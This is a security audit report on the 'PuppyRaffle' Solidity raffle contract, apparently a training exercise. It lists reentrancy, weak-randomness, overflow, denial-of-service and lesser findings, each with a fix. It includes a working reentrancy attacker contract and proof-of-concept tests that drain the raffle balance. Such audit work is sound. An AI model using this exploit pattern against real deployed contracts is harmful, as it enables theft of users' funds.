---
title: PuppyRaffle Audit Report
author: Karan
date: September 11, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries PuppyRaffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: Private Audit

Lead Auditors: 
- Karan Preet Singh

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
- [High](#high)
- [Medium](#medium)
- [Low](#low)
- [Informational](#informational)
- [Gas](#gas)

# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.

# Disclaimer

I, Karan Preet Singh , made all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by me is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

I used the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

- Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5

## Scope 

```
./src/
└── PuppyRaffle.sol
```

## Roles

- Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
- Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.

# Executive Summary

I enjoyed and learned alot auditing this report.

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 2                      |
| Low      | 1                      |
| Gas      | 2                      |
| Info     | 8                      |
| Total    | 15                     |

# Findings
## High
### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entract to drain the raffle balance

**Description:** `PuppyRaffle::refund`doesn't follow the Checks , Effect , Interact (CEI) and as a result it might lead to reentrancy attack.

In the `PuppyRaffle::refund` function , we update the active players after making an external call using `sendValue`
```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```
A player who has entered the raffle could have a `fallback/receive` function which can call the refund function again , since the activity of the player is still not updated , the player is still eligible to refund the amount. This can be continued till the raffle balance is empty.

**Impact:** All fees from the players can be stolen by attacker
**Proof of concept:**
1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

<details>
<summary>Code</summary>  

``` javascript

    function test_ReentrancyAttack() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        address attackuser = makeAddr("attackuser");
        vm.deal(attackuser , 1 ether);

        uint256 startingAttackContractBalance = address(attacker).balance;
        uint256 startingRaffleBalance = address(puppyRaffle).balance;
        vm.prank(attackuser);
        attacker.attack{value : entranceFee}();
        console.log("Starting attacker contract balance" , startingAttackContractBalance);
        console.log("Starting raffle contract balance" , startingRaffleBalance);
        console.log("Ending attacker contract balance" , address(attacker).balance);
        console.log("Ending raffle contract balance" , address(puppyRaffle).balance);
    }
```

And this contract as well

```javascript

    contract ReentrancyAttacker {
        PuppyRaffle puppyRaffle;
        uint256 entranceFee;
        uint256 attackerIndex ;

        constructor(PuppyRaffle _puppyRaffle) {
            puppyRaffle = _puppyRaffle;
            entranceFee = puppyRaffle.entranceFee();
        }
        function attack() external payable {
            address[] memory players = new address[](1);
            players[0] = address(this);
            puppyRaffle.enterRaffle{value:entranceFee}(players);
            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(attackerIndex);
        }

        function _stealMoney() internal {
            if(address(puppyRaffle).balance >= entranceFee) {
                puppyRaffle.refund(attackerIndex);
            }
        }

        fallback() external payable {
            _stealMoney();
        }

        receive() external payable {
            _stealMoney();
        }
    }

```
</details>


**Recommended Mitigation** To prevent this , active `players` array should be updated before making an external call. Addtionally , we should move the event emission up as well.

```diff

    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }

```
### [H-2] Weak randomnesss in `PuppyRaffle::selectWinner` allows users to predict or influence the winner

**Description** Hasing `msg.sender` , `block.timestamp` and `block.difficulty` together creates a predictible number shich is not a good random number.
**Impact:** Any user can influence the winner of the raffle , winning the money and selecting the 'rarest' puppy.
**Proof of Concept:** 
1. Validators can know the `block.timestamp` and `block.difficulty` beforehand for the next raffle and influence the winner
2. `msg.sender` can be changed by back tracking the winner of the raffle.

**Receommended Mitigation**
Use a cryptographically proven random numbers such as from chainlink VRF (https://chainlink.com)


### [H-3] Integer overflow of `PuppyRaffle::totalFees` leads to loss of fee.
**Description:** In solidity versions prior to `0.8.0` integers were subject to integer overflows

```javascript

    uint64 myVar = type(uint64).max
    // 18446744073709551615
    myVar = myVar + 1
    //MyVar will be 0
```
**Impact:** Integer overflow might lead to wrong calculation of `PuppyRaffle::totalFees` which might further lead to blockage of funds perpanently stuck in the contract.

**Proof of Concept:**

1. We conclude a raffle of 4 players initially.
2. We then have a 89 players enter a new raffle and select a winner out of it.
3. WE compare the fee collected before and after the second raffle.
4. Fee collected after the second raffle is lesser than the fee collected before the second raffle.


<details>
<summary>Code</summary>

```javascript
     function test_integerOverflow() public  {
        address[] memory players = new address[](4);
        uint256 playersNum = 4;
        for(uint256 i = 0 ; i < playersNum ; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: playersNum * entranceFee}(players);

        vm.warp(block.timestamp +  duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 feeCollectedBefore = puppyRaffle.totalFees();
        console.log("Fee collected after first Raffle", feeCollectedBefore);

        players = new address[](89);
        playersNum = 89;
        for(uint256 i = 0 ; i < playersNum ; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: playersNum * entranceFee}(players);

        vm.warp(block.timestamp +  duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 feeCollectedAfter = puppyRaffle.totalFees();
        console.log("Fee collected after second Raffle", feeCollectedAfter);

        // After second raffle , total fee collected by the raffle decreased
        assert(feeCollectedAfter < feeCollectedBefore );

    }
```
</details>

**Recommended Mitiagtion:**
1. Use a newer version of solility and use of `uint256 ` instead of `uint64` for `PuppyRaffle::totalFees`.
2. You could also use the `SafeMath` library of OpenZeppelin.
3. Remove the check before

## Medium

### [M-1] DoS Attack possibility in `PuppyRaffle::enterRaffle`

- IMPACT: MEDIUM
- LIKELIHOOD: MEDIUM
- SEVERITY: MEDIUM

**Description:**
Looping through the players array for large number of players might exceed the gas limit of the transaction.

**Impact:**
This kind of scenario might lead the transaction to fail and hence the wastage of gas fee

**Proof of Concept:**

- When we try to enter the first set of 100 players, the gas used is `6252047`.
- While when we try to enter the second set of 100 players , the gas used is `18068137` , which is more than three times the previous one.
- This exponential increase of gas utilization might lead to Out of gas error and hence revert the transaction.

```javascript
    function testDoSAttack() public {
        vm.txGasPrice(1);
        uint256 playersNum =  100;
        address[] memory players = new address[](playersNum);
        for(uint256 i = 0 ; i < playersNum ;i++) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value:entranceFee * playersNum}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("First 100 players gas used",gasUsedFirst);
        
        // Next 100 players
        address[] memory playersTwo = new address[](playersNum);
        for(uint256 i = 0 ; i < playersNum ;i++) {
            playersTwo[i] = address(playersNum + i);
        }
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value:entranceFee * playersNum}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("Second 100 players gas used",gasUsedSecond);
        console.log("Gas left at last",gasEndSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```

**Recommended Mitigation**

### [M-2] Smart Contract wallets raffle winner without a `receive ` or a `fallback` function will block the start of a new raffle.

**Description:** The `PuppyRaffle::selectWinner` is responsible for resetting the raffel and restarting a new one , but if the winner is smart contract wallet that rejects the payment , the lottery would not be able to restart.

Users could easily call the `selectWinner` function again and a non-wallet entrants could enter but it could cost a lot due to the duplicate check and a lottery reset could get challenging

**Impact:** The `PuppyRaffle::selectWinner` could be reverted many times , making a new raffle difficult + True winner will not be selected instead new winner will be selected for the same raffle.


**Proof of Concept:**
1. Lets say , 10 contract wallet enter the raffle with no `receive` or `fallback` function.
2. `PuppyRaffle::selectWinner` is called and the winner is selected but the funds are not transferred.
3. New raffle could not started until this raffle is over.

**Recommended Mitigation:**

Allow the user to claim the money using a new `claimPrize` function which lets the user pull the funds instead of the raffle pushing the funds to the address.

## Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for player at index 0 , causing a player at index 0 to be treated as inactive player

**Description:** If the player in `PuppyRaffle::players` array is at index 0 , this will return 0 , but it will also return 0 if the player is inactive.

```javascript

    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        
        return 0;
    }
```
**Impact:** It can cause a player at index 0 to be treated as inactive player.

**Proof of Concept**
1. User enters the raffle , they are the first player.
2. `PuppyRaffle::getActivePlayeIndex` returns 0.
3. User thinks they have not entered the raffle

**Recommended Mitigation:** The easiest would be to revert the transaction instead of returning 0 or reserve 0 index for a competition or return int256 -1 in case the player is not in the array.

## Gas optimisation

### [G-1] Unchanged state variables should be declared constant or immutable
Reading from the storage is much more gas expensive than reading from a constant or immutable variable

**Instances**
- `PuppyRaffle::raffleDuration` should be `immutable`.
- `PuppyRaffle::commonImageUri` should be `constant`.
- `PuppyRaffle::rareImageUri` should be `constant`.
- `PuppyRaffle::legendaryImageUri` should be `constant`.

### [G-2] Storage variables in oop should be cached
Calling `players.length` reada the value from store , instead use cached memory to save gas.

```diff
+   uint256 playersLength = players.length ;
+   for (uint256 i = 0; i < playersLength; i++) {
-   for (uint256 i = 0; i < players.length - 1; i++) {
+            for (uint256 j = i + 1; j < playersLength; j++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```


## Informational
### [I-1] Solidity pragma should be specific , not wide
Consider using a specific version of solidity in your contracts instead of a wide version. For example , instead of using `pragma solidity ^0.8.x;` , use `pragma solidty 0.8.x`.
- Found in src/PuppyRaffle.sol

### [I-2] Using outdated version of solidity is not recommended.
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### [I-3] Missing zero address validation
Detect missing zero address validation.

**Instances**
- Found in `PuppyRaffle::constructor._feeAddress`.

**Recommendation**
Check that the `PuppyRaffle::constructor._feeAddress` is not zero.

### [I-4] `PuppyRaffle::selectWinner` doesn't follow CEI which is not the best practise.

Its's best to keep the code clean and follow CEI.

```diff

    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
+    _safeMint(winner, tokenId);
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
-    _safeMint(winner, tokenId);
```

### [I-5] Use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase and is not readble. Its is recommened to give number a name.

### [I-6] State changes are missing events

### [I-7] Events missing indexed fields

### [I-8] `PuppyRaffle::_isActivePlayer` is never used and should be removed

